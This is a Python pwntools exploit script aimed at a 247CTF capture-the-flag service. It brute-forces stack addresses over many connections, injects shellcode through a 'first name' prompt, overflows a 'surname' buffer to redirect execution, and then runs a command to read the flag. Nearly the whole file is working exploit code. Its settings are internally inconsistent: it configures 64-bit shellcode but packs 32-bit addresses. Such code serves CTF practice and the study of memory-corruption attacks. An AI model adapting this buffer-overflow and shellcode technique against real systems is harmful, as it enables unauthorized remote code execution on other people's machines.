#!/usr/bin/env python3
from pwn import *
import sys
import itertools

context.arch = 'amd64'
context.log_level = 'error'

HOST = 'f7a5ee299a54c9f1.247ctf.com'
PORT = 50430

shellcode = asm(shellcraft.sh())

counter = 0

# Try ALL possible 32-bit addresses in common stack ranges
for addr in range(0xffffdf00, 0xfffff000, 0x10):
    counter += 1
    if counter % 100 == 0:
        print(f"[*] Tested {counter} addresses, current: 0x{addr:08x}")
        sys.stdout.flush()
    
    try:
        p = remote(HOST, PORT, level='error')
        p.recvuntil(b"first name?\n", timeout=0.3)
        
        first_input = shellcode.ljust(50, b'\x90')
        p.send(first_input)
        
        p.recvuntil(b"surname?\n", timeout=0.3)
        
        second_input = b'X' * 23 + p32(addr)
        p.send(second_input)
        
        time.sleep(0.1)
        p.sendline(b'cat /flag* 2>/dev/null')
        
        result = p.recvall(timeout=0.2)
        if b'247CTF{' in result or len(result) > 10:
            print(f"\n\n[!!!] POTENTIAL HIT with 0x{addr:08x}!")
            print(result.decode('latin1', errors='ignore'))
            
            if b'247CTF{' in result:
                print("\n[+++] FLAG FOUND!")
                with open('/tmp/CTF_FLAG.txt', 'wb') as f:
                    f.write(result)
                sys.exit(0)
        
        p.close()
    except:
        pass

print(f"[*] Completed {counter} attempts")
